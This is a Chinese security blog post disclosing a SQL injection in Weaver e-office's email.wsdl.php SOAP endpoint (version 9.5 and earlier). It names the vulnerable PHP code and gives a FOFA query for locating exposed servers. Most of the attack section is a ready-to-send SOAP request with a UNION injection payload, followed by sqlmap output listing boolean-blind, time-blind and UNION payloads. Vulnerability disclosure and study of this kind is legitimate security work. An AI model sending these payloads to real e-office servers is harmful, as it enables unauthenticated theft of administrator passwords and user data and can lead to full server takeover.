---
title: "泛微e-office email.wsdl.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-webservice-json-email-wsdl-sqli.html
asset_dir: assets/泛微e-office-email.wsdl.php-sql注入漏洞
---

# 泛微e-office email.wsdl.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/21 18:36
- 966浏览
- [0评论](#comment)
- 44分钟阅读

深入探索

软件

Office

电子邮件

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)E-Office是一款标准化的协同 OA 办公[软件](#)，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office [email](#).wsdl.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

商务软件和生产力软件

# 影响版本

e-office <=9.5

# fofa语句

> `app="泛微-EOffice"`

# 漏洞分析

同样通过解析 wsdl 后有很多功能

[![泛微e-office email.wsdl.php sql注入漏洞](images/img-001-30739053c625.webp)](https://image.mrxn.net/408ed73fef9d4e169fc87f40dba77cc3.webp)

[webservice](#)-json/email/email.wsdl.php 的 `GetEmailSingle` 业务逻辑如下

电子邮件与即时消息

```
function GetEmailSingle( $id, $box )
{
    global $attachment_url;
    $email = authcheck( array( ) );
    $Infor = array( );
    $data = $email->getEmailById( $id, $box );
```

深入探索

安全工具开发

恶意软件分析工具

防火墙软件

`$id, $box` 首先带入 `getEmailById` 函数

```
public function getEmailById( $id, $box = "" )
{
  global $connection;
  $sql = " select * from email where email_id = '{$id}' ";
  $cursor = exequery( $connection, $sql );
```

`$id` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
POST /webservice-json/email/email.wsdl.php HTTP/1.1
User-Agent: Apache-HttpClient/4.5.5 (Java/17.0.12)
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
SOAPAction: urn:EmailServicewsdl#GetEmailSingle
Content-Type: text/xml;charset=UTF-8
Host: eoffice.mrxn.net:8082

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:EmailServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:GetEmailSingle soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <id xsi:type="xsd:string">3' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71706b6b71,0x4b6453444f4253756546476e51716974767a57664c61657a616b4e6e5065414d676c6a6473525876,0x717a706a71)#</id>
         <box xsi:type="xsd:string">gero</box>
      </urn:GetEmailSingle>
   </soapenv:Body>
</soapenv:Envelope>
```

深入探索

传输层安全性协议

企业安全咨询

Web安全书籍

[![泛微e-office email.wsdl.php sql注入漏洞](images/img-002-dd2276f86521.webp)](https://image.mrxn.net/33231a961de54d7ea6b4fc27585418a9.webp)

成功在响应回显联合注入payload

编程

[sqlmap](https://mrxn.net/tag/sqlmap) 结果如下

```
sqlmap identified the following injection point(s) with a total of 201 HTTP(s) requests:
---
Parameter: SOAP #1* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:EmailServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:GetEmailSingle soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <id xsi:type="xsd:string">3' RLIKE (SELECT (CASE WHEN (6754=6754) THEN 3 ELSE 0x28 END))-- wGmX</id>
         <box xsi:type="xsd:string">gero</box>
      </urn:GetEmailSingle>
   </soapenv:Body>
</soapenv:Envelope>

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:EmailServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:GetEmailSingle soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <id xsi:type="xsd:string">3' AND 6981=BENCHMARK(5000000,MD5(0x4c6e4c70))-- CxQt</id>
         <box xsi:type="xsd:string">gero</box>
      </urn:GetEmailSingle>
   </soapenv:Body>
</soapenv:Envelope>

    Type: UNION query
    Title: MySQL UNION query (NULL) - 17 columns
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:EmailServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:GetEmailSingle soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <id xsi:type="xsd:string">3' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71706b6b71,0x4b6453444f4253756546476e51716974767a57664c61657a616b4e6e5065414d676c6a6473525876,0x717a706a71)#</id>
         <box xsi:type="xsd:string">gero</box>
      </urn:GetEmailSingle>
   </soapenv:Body>
</soapenv:Envelope>
---
```

# 其他

burp wsdler 插件默认解析或者soap本身解析的参数是 int 类型，不妨手动更改成string类型，当后端校验不足时，说不定有意外收获！

代码安全审计

[![泛微e-office email.wsdl.php sql注入漏洞](images/img-003-ab5438226034.webp)](https://image.mrxn.net/469f7630e0b54b7da8a49d5611ad65c7.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语句](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.其他](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
